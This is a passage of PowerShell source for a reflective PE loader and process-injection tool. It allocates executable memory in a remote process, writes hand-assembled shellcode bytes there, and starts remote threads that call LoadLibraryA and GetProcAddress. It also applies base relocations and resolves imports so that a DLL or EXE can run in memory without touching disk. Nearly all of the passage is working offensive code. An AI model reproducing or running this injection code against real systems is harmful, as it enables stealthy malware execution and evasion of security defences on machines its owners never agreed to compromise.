        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)

        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)

        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    #   PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }

        $PEInfo = New-Object System.Object

        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types

        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }

        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }

        return $PEInfo
    }


    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)

        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes

        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }


            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem

            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)


            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }

            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }

            $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }

            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }

        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        return $DllAddress
    }


    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,

        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $FunctionName
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        $FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)

        #Write FunctionName to memory (will be used in GetProcAddress)
        $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
        $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RFuncNamePtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($FunctionNameSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes


        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }


        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        #todo: need to have detection for when to get by ordinal
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem

        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)

        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }

        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }

        $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }

        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)

            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))

            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            #    so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }

            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }

            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }

            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)

        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }

        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])

                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }

            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )

        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)

                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }

                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $ProcedureName = ''
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([Int64]$OriginalThunkRefVal -lt 0)
                    {
                        $ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                    }

                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
                    }
                    else
                    {
                        if($ProcedureName -is [string])
                        {
                            [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
                        }
                        else
                        {
                            [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressOrdinal.Invoke($ImportDllHandle, $ProcedureName)
                        }
                    }

                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)

                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
